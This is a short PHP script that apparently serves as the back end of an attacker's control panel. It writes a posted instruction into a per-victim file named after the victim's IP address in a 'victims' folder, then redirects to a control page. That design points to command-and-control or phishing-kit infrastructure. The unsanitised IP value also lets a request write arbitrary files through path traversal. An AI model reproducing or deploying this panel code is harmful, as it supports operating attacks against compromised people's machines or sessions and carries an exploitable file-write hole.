<?php
	
	if ($_POST['step'] == "control") {
        $fp = fopen('../../../victims/'. $_POST['ip'] .'.txt', 'wb');
        fwrite($fp, $_POST['to']);
        fclose($fp);
        header("location: ../../../control.html?ip=" . $_POST['ip']);
        exit();
    }

?>